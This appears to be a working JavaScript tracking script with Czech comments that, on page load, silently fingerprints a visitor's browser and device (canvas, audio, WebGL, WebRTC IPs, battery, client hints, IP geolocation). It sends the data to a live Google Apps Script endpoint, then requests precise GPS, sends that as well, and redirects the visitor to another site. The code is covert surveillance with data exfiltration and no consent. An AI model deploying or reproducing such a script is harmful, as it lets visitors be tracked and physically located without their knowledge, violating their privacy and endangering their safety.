// ============================================================
//  Maximální verze – tiché odeslání dat + GPS + redirect
// ============================================================
const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxprgtURbKRGy3QD-gi9d9aQCn5a51iaiHX4of5QkbT0vnODFvLS1XN22QiPwG6gdgOAA/exec";
const REDIRECT_URL = "https://vzdelanylid.cz";

const visitId = (crypto.randomUUID ? crypto.randomUUID() : 
    Date.now().toString(36) + Math.random().toString(36).substring(2));

document.addEventListener("DOMContentLoaded", () => {
    collectAndSend();
});

// -------------------- Pomocné funkce --------------------

function simpleHash(str) {
    // Rychlý ne-kryptografický hash pro fingerprinty
    let hash = 0;
    if (!str || str.length === 0) return "0";
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(16);
}

async function getCanvasFingerprint() {
    try {
        const canvas = document.createElement("canvas");
        canvas.width = 240;
        canvas.height = 60;
        const ctx = canvas.getContext("2d");
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 4, 17);
        return simpleHash(canvas.toDataURL());
    } catch (e) {
        return "error";
    }
}

async function getAudioFingerprint() {
    try {
        const AudioCtx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
        if (!AudioCtx) return "unsupported";
        const context = new AudioCtx(1, 44100, 44100);
        const oscillator = context.createOscillator();
        oscillator.type = "triangle";
        oscillator.frequency.setValueAtTime(10000, context.currentTime);
        const compressor = context.createDynamicsCompressor();
        compressor.threshold.setValueAtTime(-50, context.currentTime);
        compressor.knee.setValueAtTime(40, context.currentTime);
        compressor.ratio.setValueAtTime(12, context.currentTime);
        compressor.attack.setValueAtTime(0, context.currentTime);
        compressor.release.setValueAtTime(0.25, context.currentTime);
        oscillator.connect(compressor);
        compressor.connect(context.destination);
        oscillator.start(0);
        const buffer = await context.startRendering();
        const data = buffer.getChannelData(0);
        let sum = 0;
        for (let i = 4500; i < 5000; i++) {
            sum += Math.abs(data[i]);
        }
        return simpleHash(sum.toString());
    } catch (e) {
        return "error";
    }
}

function getWebGLInfo() {
    const result = { vendor: "Nezjištěno", renderer: "Nezjištěno" };
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (gl) {
            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
            if (debugInfo) {
                result.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || "Nezjištěno";
                result.renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "Nezjištěno";
            } else {
                result.vendor = gl.getParameter(gl.VENDOR) || "Nezjištěno";
                result.renderer = gl.getParameter(gl.RENDERER) || "Nezjištěno";
            }
        }
    } catch (e) {}
    return result;
}

async function getMediaDevicesInfo() {
    try {
        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
            return { audioinput: 0, videoinput: 0, audiooutput: 0 };
        }
        const devices = await navigator.mediaDevices.enumerateDevices();
        const counts = { audioinput: 0, videoinput: 0, audiooutput: 0 };
        devices.forEach(d => {
            if (counts[d.kind] !== undefined) counts[d.kind]++;
        });
        return counts;
    } catch (e) {
        return { audioinput: -1, videoinput: -1, audiooutput: -1 };
    }
}

function getWebRTCIPs() {
    return new Promise((resolve) => {
        const ips = [];
        try {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = (event) => {
                if (!event || !event.candidate || !event.candidate.candidate) {
                    pc.close();
                    resolve([...new Set(ips)]);
                    return;
                }
                const parts = event.candidate.candidate.split(" ");
                const ip = parts[4];
                if (ip && !ips.includes(ip)) ips.push(ip);
            };
            // Timeout – nečekáme věčně
            setTimeout(() => {
                try { pc.close(); } catch (e) {}
                resolve([...new Set(ips)]);
            }, 2000);
        } catch (e) {
            resolve([]);
        }
    });
}

async function getClientHints() {
    try {
        if (!navigator.userAgentData) return null;
        const highEntropy = await navigator.userAgentData.getHighEntropyValues([
            "architecture", "bitness", "model", "platformVersion",
            "fullVersionList", "wow64", "formFactors"
        ]);
        return {
            brands: navigator.userAgentData.brands,
            mobile: navigator.userAgentData.mobile,
            platform: navigator.userAgentData.platform,
            ...highEntropy
        };
    } catch (e) {
        return null;
    }
}

function getMatchMediaFeatures() {
    const features = {};
    const queries = [
        ["prefersColorScheme", "(prefers-color-scheme: dark)"],
        ["prefersReducedMotion", "(prefers-reduced-motion: reduce)"],
        ["prefersContrast", "(prefers-contrast: more)"],
        ["colorGamut", "(color-gamut: p3)"],
        ["hdr", "(dynamic-range: high)"],
        ["invertedColors", "(inverted-colors: inverted)"],
        ["hover", "(hover: hover)"],
        ["pointerFine", "(pointer: fine)"]
    ];
    queries.forEach(([key, query]) => {
        try {
            features[key] = window.matchMedia(query).matches;
        } catch (e) {
            features[key] = null;
        }
    });
    return features;
}

// -------------------- Hlavní sběr --------------------

async function collectAndSend() {
    // Parallelní sběr náročnějších věcí
    const [canvasHash, audioHash, mediaDevices, webrtcIPs, clientHints] = await Promise.all([
        getCanvasFingerprint(),
        getAudioFingerprint(),
        getMediaDevicesInfo(),
        getWebRTCIPs(),
        getClientHints()
    ]);

    const webgl = getWebGLInfo();
    const matchMedia = getMatchMediaFeatures();

    // Baterie
    let batteryValue = "Nezjištěno";
    try {
        if ("getBattery" in navigator) {
            const battery = await navigator.getBattery();
            const level = Math.round(battery.level * 100);
            const charging = battery.charging ? " (Nabíjí se)" : " (Vybíjí se)";
            batteryValue = `${level}%${charging}`;
        }
    } catch (e) {}

    // Síť
    let netType = "Neznámo";
    let netSpeed = "Neznámo";
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
        netType = connection.effectiveType || "Neznámo";
        netSpeed = `RTT: ${connection.rtt}ms, Downlink: ${connection.downlink}Mb/s`;
    }

    // IP + geo
    let ip = "Nezjištěno", org = "", city = "", country = "";
    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        ip = data.ip || "Nezjištěno";
        org = data.org || "";
        city = data.city || "";
        country = data.country_name || "";
    } catch (e) {
        try {
            const r = await fetch("https://api.ipify.org?format=json");
            const d = await r.json();
            ip = d.ip || "Nezjištěno";
        } catch (e2) {}
    }

    // Storage
    let localStorageEnabled = false, sessionStorageEnabled = false;
    try { localStorageEnabled = !!window.localStorage; localStorage.setItem("_t", "1"); localStorage.removeItem("_t"); } catch (e) {}
    try { sessionStorageEnabled = !!window.sessionStorage; } catch (e) {}

    const payload = {
        type: "fingerprint",
        visitId: visitId,
        timestamp: new Date().toISOString(),

        // Síť
        ip: ip,
        isp: org,
        city: city,
        country: country,
        netType: netType,
        netSpeed: netSpeed,
        webrtcIPs: webrtcIPs.join(", ") || "",

        // Hardware
        cpu: navigator.hardwareConcurrency || null,
        ram: navigator.deviceMemory || null,
        screen: `${window.screen.width}x${window.screen.height}`,
        availScreen: `${window.screen.availWidth}x${window.screen.availHeight}`,
        colorDepth: window.screen.colorDepth,
        pixelRatio: window.devicePixelRatio || 1,
        gpuVendor: webgl.vendor,
        gpuRenderer: webgl.renderer,
        battery: batteryValue,

        // Software / prohlížeč
        userAgent: navigator.userAgent,
        platform: navigator.platform || "",
        vendor: navigator.vendor || "",
        language: navigator.languages ? navigator.languages.join(", ") : navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        touchPoints: navigator.maxTouchPoints || 0,
        doNotTrack: navigator.doNotTrack === "1" ? "Ano" : "Ne / Neuvedeno",
        cookieEnabled: navigator.cookieEnabled,
        localStorage: localStorageEnabled,
        sessionStorage: sessionStorageEnabled,
        webdriver: navigator.webdriver === true,

        // Fingerprint hashe
        canvasHash: canvasHash,
        audioHash: audioHash,

        // Media
        audioInput: mediaDevices.audioinput,
        videoInput: mediaDevices.videoinput,
        audioOutput: mediaDevices.audiooutput,

        // matchMedia
        prefersColorScheme: matchMedia.prefersColorScheme ? "dark" : "light",
        prefersReducedMotion: matchMedia.prefersReducedMotion,
        colorGamutP3: matchMedia.colorGamut,
        hdr: matchMedia.hdr,
        hover: matchMedia.hover,
        pointerFine: matchMedia.pointerFine,

        // Client Hints (JSON string)
        clientHints: clientHints ? JSON.stringify(clientHints) : "",

        // GPS (zatím prázdné)
        latitude: null,
        longitude: null,
        accuracy: null
    };

    try {
        await sendToSheets(payload);
    } catch (err) {
        console.error("Chyba při odesílání fingerprintu:", err);
    }

    requestGPSAndRedirect();
}

async function sendToSheets(data) {
    if (!APPS_SCRIPT_URL || APPS_SCRIPT_URL.includes("VAŠE_DEPLOYMENT_ID")) {
        console.log("Payload (demo):", data);
        return { status: "demo" };
    }

    const response = await fetch(APPS_SCRIPT_URL, {
        method: "POST",
        redirect: "follow",
        headers: { "Content-Type": "text/plain;charset=utf-8" },
        body: JSON.stringify(data)
    });

    const text = await response.text();
    let result;
    try { result = JSON.parse(text); } catch { result = { status: "ok", raw: text }; }
    if (result.status === "error") throw new Error(result.message || "Chyba z Apps Script");
    return result;
}

function requestGPSAndRedirect() {
    if (!navigator.geolocation) {
        window.location.href = REDIRECT_URL;
        return;
    }

    navigator.geolocation.getCurrentPosition(
        async (pos) => {
            const gpsPayload = {
                type: "gps",
                visitId: visitId,
                timestamp: new Date().toISOString(),
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: Math.round(pos.coords.accuracy)
            };
            try { await sendToSheets(gpsPayload); } catch (err) {
                console.error("Chyba při odesílání GPS:", err);
            }
            window.location.href = REDIRECT_URL;
        },
        () => {
            window.location.href = REDIRECT_URL;
        },
        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
    );
}
